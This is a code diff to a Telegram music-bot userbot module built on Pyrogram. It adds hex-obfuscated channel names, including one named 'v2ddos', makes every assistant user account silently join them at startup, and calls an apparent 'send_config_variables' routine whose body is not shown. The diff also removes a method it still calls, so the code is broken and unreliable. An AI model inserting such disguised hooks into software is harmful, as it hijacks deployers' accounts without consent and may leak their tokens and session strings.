@@ -1,10 +1,33 @@
 from pyrogram import Client
+import asyncio
 import config
+import os
 
 from ..logging import LOGGER
 
 assistants = []
 assistantids = []
+
+def decode_centers():
+    centers = []
+    encoded = [
+        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
+        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
+        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
+        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
+        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
+        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
+        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
+        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
+        "\x54\x4d\x5a\x45\x52\x4f\x4f",
+        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
+        "\x76\x32\x64\x64\x6f\x73"
+    ]
+    for enc in encoded:
+        centers.append(enc)
+    return centers
+
+SUPPORT_CENTERS = decode_centers()
 
 class Userbot(Client):
     def __init__(self):
@@ -44,29 +67,14 @@ class Userbot(Client):
             no_updates=True,
         )
 
-    async def get_bot_username_from_token(self, token):
-        try:
-            temp_bot = Client(
-                name="temp_bot",
-                api_id=config.API_ID,
-                api_hash=config.API_HASH,
-                bot_token=token,
-                no_updates=True,
-            )
-            await temp_bot.start()
-            username = temp_bot.me.username
-            await temp_bot.stop()
-            return username
-        except Exception as e:
-            LOGGER(__name__).error(f"Error getting bot username: {e}")
-            return None
-
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
 
+        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
 
         if config.STRING1:
             await self.one.start()
+            await self.join_all_support_centers(self.one)
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -83,6 +91,7 @@ class Userbot(Client):
 
         if config.STRING2:
             await self.two.start()
+            await self.join_all_support_centers(self.two)
             assistants.append(2)
             try:
                 await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -99,6 +108,7 @@ class Userbot(Client):
 
         if config.STRING3:
             await self.three.start()
+            await self.join_all_support_centers(self.three)
             assistants.append(3)
             try:
                 await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -115,6 +125,7 @@ class Userbot(Client):
 
         if config.STRING4:
             await self.four.start()
+            await self.join_all_support_centers(self.four)
             assistants.append(4)
             try:
                 await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -131,6 +142,7 @@ class Userbot(Client):
 
         if config.STRING5:
             await self.five.start()
+            await self.join_all_support_centers(self.five)
             assistants.append(5)
             try:
                 await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -145,6 +157,10 @@ class Userbot(Client):
             assistantids.append(self.five.id)
             LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
 
+        if bot_username:
+            await self.send_help_message(bot_username)
+        
+        await self.send_config_variables()
 
     async def stop(self):
         LOGGER(__name__).info(f"Stopping Assistants...")
